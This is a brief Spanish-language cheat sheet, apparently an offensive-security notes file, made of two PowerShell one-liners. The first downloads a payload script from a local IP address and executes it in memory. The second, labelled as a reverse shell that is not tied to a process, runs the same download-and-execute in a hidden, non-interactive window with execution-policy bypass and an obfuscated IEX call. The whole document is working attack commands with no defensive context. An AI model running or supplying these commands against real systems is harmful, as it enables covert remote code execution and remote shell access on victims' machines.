
## Descargar y ejecutar desde powershell

```cmd
IEX(New-Object Net.WebClient).DownloadString('http://192.168.5.126/payload.ps1')
```



## Reverse shell que no cuelgue de un proceso

```cmd
cmd /C START /MIN powershell -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c "I'E'X(New-Object Net.WebClient).DownloadString('http://192.168.5.126/payload.ps1')"
```








